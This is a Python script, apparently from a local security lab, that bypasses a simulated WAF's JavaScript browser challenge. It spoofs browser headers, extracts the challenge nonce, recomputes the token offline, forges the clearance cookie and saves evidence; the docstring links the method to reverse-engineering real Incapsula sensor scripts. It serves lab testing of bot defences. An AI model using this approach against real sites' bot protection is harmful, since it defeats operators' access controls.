#!/usr/bin/env python3
"""
"Crack the cipher" bypass: reimplements the WAF's JS challenge algorithm in
pure Python so we can forge a valid `incap_ses_lab` cookie without ever
running JavaScript or launching a browser. This mirrors the real-world
technique of reverse-engineering a WAF's obfuscated sensor script
(Incapsula's `reese84`/`___utmvc`, etc. in the wild) and reimplementing its
token generation server-side/offline.

Steps:
  1. Send realistic browser-like headers (User-Agent, Accept-Language) --
     without these the WAF blocks on signature/header heuristics alone,
     before the challenge logic is ever reached.
  2. GET the page. With no incap_ses_lab cookie yet, the WAF returns the
     "Checking your browser..." challenge page and sets a `waf_sess` cookie.
     Extract the nonce embedded in that page's JS.
  3. Recompute the token from the nonce using the same algorithm the
     challenge JS runs client-side (see waf-proxy/proxy.py:compute_token /
     challenge_page -- reverse the nonce, byte-shift+hex-encode it, base64
     the pair).
  4. Set that forged token as the `incap_ses_lab` cookie and re-request.
     The WAF verifies it server-side and lets the (still browser-less)
     request through to the origin.

    python3 crack_cipher_client.py http://localhost:8080/
"""
import base64
import json
import os
import re
import sys
import time

import requests

SALT_SHIFT = 7  # must match waf-proxy/proxy.py


def solve_challenge(nonce: str) -> str:
    reversed_nonce = nonce[::-1]
    shifted = "".join(f"{(ord(c) + SALT_SHIFT) % 256:02x}" for c in nonce)
    return base64.b64encode(f"{reversed_nonce}|{shifted}".encode()).decode()


def main():
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080/"
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept-Language": "en-US,en;q=0.9",
    }
    session = requests.Session()
    session.headers.update(headers)

    first = session.get(url, timeout=5)
    print(f"[1] GET {url} -> {first.status_code} (expect challenge page)")

    match = re.search(r"var n='([0-9a-f]+)'", first.text)
    if not match:
        print("No challenge nonce found -- already verified, or blocked before the challenge stage.")
        print(first.text[:300])
        return

    nonce = match.group(1)
    token = solve_challenge(nonce)
    print(f"[2] extracted nonce={nonce} -> forged token={token}")

    session.cookies.set("incap_ses_lab", token)
    time.sleep(0.2)  # be a little polite to the rate limiter, not required
    second = session.get(url, timeout=5)
    print(f"[3] GET {url} (with forged cookie) -> {second.status_code}")
    print(second.text[:500])

    os.makedirs(os.path.join(os.path.dirname(__file__), "..", "evidence"), exist_ok=True)
    evidence_path = os.path.join(os.path.dirname(__file__), "..", "evidence", "crack_cipher_result.json")
    with open(evidence_path, "w") as f:
        json.dump(
            {
                "url": url,
                "nonce": nonce,
                "forged_token": token,
                "challenge_status": first.status_code,
                "final_status": second.status_code,
                "final_body_excerpt": second.text[:300],
            },
            f,
            indent=2,
        )
    print(f"[4] evidence written to {evidence_path}")


if __name__ == "__main__":
    main()
